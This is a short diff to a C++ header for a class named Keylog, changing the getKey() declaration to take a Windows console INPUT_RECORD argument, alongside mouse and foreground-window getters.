@@ -20,7 +20,7 @@ class Keylog
 public:
 	Keylog();
 	~Keylog();
-	int		getKey();
+	int		getKey(const INPUT_RECORD);
 	int		getMouse();
 	int		getForeground();
 
